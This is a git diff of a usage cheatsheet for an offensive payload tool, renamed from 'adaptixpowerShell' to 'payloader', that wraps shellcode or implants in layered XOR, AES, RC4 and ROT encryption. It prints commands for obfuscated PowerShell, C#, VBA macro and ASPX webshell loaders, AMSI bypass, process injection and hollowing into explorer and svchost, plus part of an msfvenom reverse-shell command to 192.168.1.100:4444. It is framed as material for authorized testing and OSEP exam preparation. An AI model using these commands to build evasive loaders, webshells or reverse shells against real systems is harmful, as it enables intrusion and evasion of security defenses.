@@ -1,4 +1,4 @@
-# AdaptixPowerShell – Usage Cheatsheet
+# payloader – Usage Cheatsheet
 
 > **For authorized security testing and educational use only.**
 
@@ -8,10 +8,10 @@
 
 ```bash
 # Default: XOR-encrypted PowerShell loader
-python3 adaptixpowerShell.py shellcode.bin
+python3 payloader.py shellcode.bin
 
 # From .exe (auto-converts via donut)
-python3 adaptixpowerShell.py implant.exe
+python3 payloader.py implant.exe
 ```
 
 ---
@@ -26,10 +26,10 @@ python3 adaptixpowerShell.py implant.exe
 | ROT-N | `--encryption ROT` | `--rot-n 13` | Caesar-style byte rotation. |
 
 ```bash
-python3 adaptixpowerShell.py shell.bin --encryption XOR    --key 0xAA
-python3 adaptixpowerShell.py shell.bin --encryption AES256 --key "s3cr3tK3y" --iv "1234567890abcdef"
-python3 adaptixpowerShell.py shell.bin --encryption RC4    --key "MyRC4Key"
-python3 adaptixpowerShell.py shell.bin --encryption ROT    --rot-n 13
+python3 payloader.py shell.bin --encryption XOR    --key 0xAA
+python3 payloader.py shell.bin --encryption AES256 --key "s3cr3tK3y" --iv "1234567890abcdef"
+python3 payloader.py shell.bin --encryption RC4    --key "MyRC4Key"
+python3 payloader.py shell.bin --encryption ROT    --rot-n 13
 ```
 
 ---
@@ -43,23 +43,23 @@ Chain format: `algo:KEY=value,algo:KEY=value;IV=value,...`
 
 ```bash
 # 2-layer: XOR then ROT
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --chain "xor:KEY=0xAA,rot:N=13"
 
 # 3-layer: XOR → RC4 → ROT  (MacroPhantom style)
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --chain "xor:KEY=0xBB,rc4:KEY=osepkey,rot:N=7"
 
 # 3-layer: AES → XOR → ROT  (CerberusObfuscator style)
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --chain "aes256:KEY=MySecret;IV=1234567890abcdef,xor:KEY=0xCC,rot:N=42"
 
 # 4-layer: AES → RC4 → XOR → ROT  (quad-layer)
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --chain "aes256:KEY=layer1key,rc4:KEY=layer2,xor:KEY=0xDD,rot:N=5"
 
 # Random keys (omit KEY= for auto-generated random key per run)
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --chain "aes256,xor,rot:N=13"
 ```
 
@@ -79,13 +79,13 @@ Comma-separated, multiple formats in one run:
 
 ```bash
 # Single format
-python3 adaptixpowerShell.py shell.bin --output-format cs
+python3 payloader.py shell.bin --output-format cs
 
 # Multiple formats in one run
-python3 adaptixpowerShell.py shell.bin --output-format ps1,cs,vba,bin
+python3 payloader.py shell.bin --output-format ps1,cs,vba,bin
 
 # All formats (VBA/ASPX require XOR or ROT chain)
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --encryption XOR --key 0xAA \
   --output-format ps1,vba,cs,aspx,bin
 ```
@@ -103,20 +103,20 @@ python3 adaptixpowerShell.py shell.bin \
 
 ```bash
 # Self-process (default)
-python3 adaptixpowerShell.py shell.bin --output-format cs --injection-method valloc
+python3 payloader.py shell.bin --output-format cs --injection-method valloc
 
 # Inject into explorer.exe (default target)
-python3 adaptixpowerShell.py shell.bin --output-format cs --injection-method pinject
+python3 payloader.py shell.bin --output-format cs --injection-method pinject
 
 # Inject into a specific process
-python3 adaptixpowerShell.py shell.bin --output-format cs \
+python3 payloader.py shell.bin --output-format cs \
   --injection-method pinject --target-process svchost
 
 # NT-level section injection (lower API footprint)
-python3 adaptixpowerShell.py shell.bin --output-format cs --injection-method ntinject
+python3 payloader.py shell.bin --output-format cs --injection-method ntinject
 
 # Process hollowing into svchost
-python3 adaptixpowerShell.py shell.bin --output-format cs \
+python3 payloader.py shell.bin --output-format cs \
   --injection-method hollow
 ```
 
@@ -133,10 +133,10 @@ python3 adaptixpowerShell.py shell.bin --output-format cs \
 | `5` | Insane – maximum fragmentation |
 
 ```bash
-python3 adaptixpowerShell.py shell.bin -l 1          # Light
-python3 adaptixpowerShell.py shell.bin -l 5          # Insane
-python3 adaptixpowerShell.py shell.bin --no-obfuscate # Off (for debugging)
-python3 adaptixpowerShell.py shell.bin -d             # Debug Write-Host output
+python3 payloader.py shell.bin -l 1          # Light
+python3 payloader.py shell.bin -l 5          # Insane
+python3 payloader.py shell.bin --no-obfuscate # Off (for debugging)
+python3 payloader.py shell.bin -d             # Debug Write-Host output
 ```
 
 ---
@@ -145,16 +145,16 @@ python3 adaptixpowerShell.py shell.bin -d             # Debug Write-Host output
 
 ```bash
 # Default: x86+amd64, AMSI bypass continues on fail
-python3 adaptixpowerShell.py implant.exe
+python3 payloader.py implant.exe
 
 # x64 only
-python3 adaptixpowerShell.py implant.exe --arch 2
+python3 payloader.py implant.exe --arch 2
 
 # Pass command line args to the implant
-python3 adaptixpowerShell.py implant.exe --params "192.168.1.100 4444"
+python3 payloader.py implant.exe --params "192.168.1.100 4444"
 
 # No AMSI bypass from donut (handle in PS1 layer instead)
-python3 adaptixpowerShell.py implant.exe --bypass 1
+python3 payloader.py implant.exe --bypass 1
 ```
 
 ---
@@ -163,34 +163,34 @@ python3 adaptixpowerShell.py implant.exe --bypass 1
 
 ```bash
 # --- OSEP: C# loader, AES-256, remote thread injection ---
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --encryption AES256 --key "0s3pExamKey2026!" \
   --output-format cs --injection-method pinject \
   --target-process explorer
 
 # --- OSEP: VBA macro with dual-layer XOR+ROT (MacroPhantom style) ---
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --chain "xor:KEY=0xAA,rot:N=13" \
   --output-format vba
 
 # --- OSEP: Obfuscated PS1 with RC4, max obfuscation ---
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --encryption RC4 --key "osepRC4key" \
   --output-format ps1 -l 5
 
 # --- OSEP: ASPX webshell with XOR ---
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --encryption XOR --key 0xBEEF \
   --output-format aspx
 
 # --- OSEP: All formats, 3-layer chain, PS1 + CS + VBA ---
-python3 adaptixpowerShell.py shell.bin \
+python3 payloader.py shell.bin \
   --chain "xor:KEY=0xAA,rc4:KEY=mykey,rot:N=7" \
   --output-format ps1,cs,vba \
   --injection-method ntinject -l 4
 
 # --- OSEP: .exe implant → all formats, obfuscation level 5 ---
-python3 adaptixpowerShell.py implant.exe \
+python3 payloader.py implant.exe \
   --arch 2 --bypass 3 \
   --chain "aes256:KEY=ImplantKey2026,xor:KEY=0xCC" \
   --output-format ps1,cs -l 5
@@ -214,7 +214,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw 
 Then pass directly to the tool:
 
 ```bash
-python3 adaptixpowerShell.py shell.bin --chain "aes256:KEY=MyKey,xor:KEY=0xAA" --output-format ps1,cs -l 4
+python3 payloader.py shell.bin --chain "aes256:KEY=MyKey,xor:KEY=0xAA" --output-format ps1,cs -l 4
 ```
 
 ---
